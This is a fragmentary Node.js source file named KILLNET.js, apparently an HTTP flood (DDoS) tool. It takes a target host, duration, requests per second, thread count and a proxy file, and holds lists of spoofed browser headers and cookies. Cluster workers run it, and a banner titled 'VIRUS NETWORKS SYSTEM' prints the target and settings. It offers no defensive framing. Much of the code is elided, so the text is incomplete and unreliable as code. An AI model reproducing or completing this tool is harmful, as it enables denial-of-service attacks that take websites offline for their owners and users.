const net = require("net");
 ...
 if (process.argv.length < 7){console.log('example: node KILLNET.js <host> <time> <rps> <threads> <proxyfile>'); process.exit();}
 const headers = {};
...
const cplist = [
 ...
 const accept_header = [
  ...
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    ...
    'User-Agents: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
    'Connection: keep-alive',
...
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
 ...
 const cookie1 = [
    ...
    "--user-agents=Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
 ...
 const parsedTarget = url.parse(args.target);
      ...
      if (cluster.isMaster) {
        ...
        console.log(` 
                 ...
                 VIRUS NETWORKS SYSTEM 
_____________________________________________________________                              

`);
        console.log("\n");
        console.log("𝗧𝗘𝗥𝗚𝗘𝗧: " + process.argv[2]);
        console.log("𝗧𝗜𝗠𝗘𝗦: "+ process.argv[3]);
        console.log("𝗥𝗣𝗦: "+ process.argv[4]);
        console.log("𝗧𝗛𝗥𝗘𝗔𝗗𝗦: "+ process.argv[5]);
        console.log("𝗣𝗥𝗢𝗫𝗬: "+ process.argv[6]);
      } else {
